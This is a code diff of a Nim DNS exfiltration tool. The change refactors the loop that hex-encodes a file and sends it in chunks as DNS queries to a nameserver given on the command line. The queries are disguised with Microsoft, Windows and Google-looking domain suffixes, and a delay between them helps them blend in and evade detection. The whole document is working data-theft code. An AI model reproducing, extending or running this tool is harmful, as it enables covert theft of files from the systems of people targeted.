@@ -14,6 +14,17 @@ proc resolve(client: DnsClient, data: string): void =
             #echo "[DEBUG] ERROR ", data
             quit(e.msg)
 
+proc chuckIndX(client: DnsClient, data: string, chuckSize: int, domain: string, slp: int): void =
+    var stringindex: int
+    while stringindex <= data.len-1:
+        let
+            query =  data[stringindex .. (if stringindex + chuckSize - 1 > data.len - 1: data.len - 1 else: stringindex + chuckSize - 1)]
+            dnsquery = query & domain
+
+        resolve(client, dnsquery)
+        inc(stringindex, chuckSize)
+        sleep(slp)
+
 proc dnsExfil(ns: string, file: string, slp: int): void =
     let
         client = initDnsClient(ns)
@@ -22,22 +33,10 @@ proc dnsExfil(ns: string, file: string, slp: int): void =
         chuckSize = 20 # max 62
         domains = [".client.a.msn.windows.com", ".a.wns.update.windows.com", ".a.wns.o365.microsoft.com", ".msft.a.msn.microsoft.com"]
     
-    var stringindex: int
-    
     echo "[+] Sending ", file, " [lengh: ", content.len, "]"
     
-    resolve(client, file.toHex & ".bb.googleusercontent.com")
-
-    while stringindex <= hex.len-1:
-        let
-            query =  hex[stringindex .. (if stringindex + chuckSize - 1 > hex.len - 1: hex.len - 1 else: stringindex + chuckSize - 1)]
-            dnsquery = query & sample(domains)
-
-        resolve(client, dnsquery)
-        
-        inc(stringindex, chuckSize)
-        sleep(slp)
-
+    chuckIndX(client, file.toHex, chuckSize, ".bb.googleusercontent.com", slp)
+    chuckIndX(client, hex, chuckSize, sample(domains), slp)
     resolve(client, "quit")
 
     echo "[+] Done!"
@@ -50,4 +49,3 @@ when isMainModule:
         quit()
     else:
         dnsExfil(paramStr(1), paramStr(2), parseInt(paramStr(3)))
-
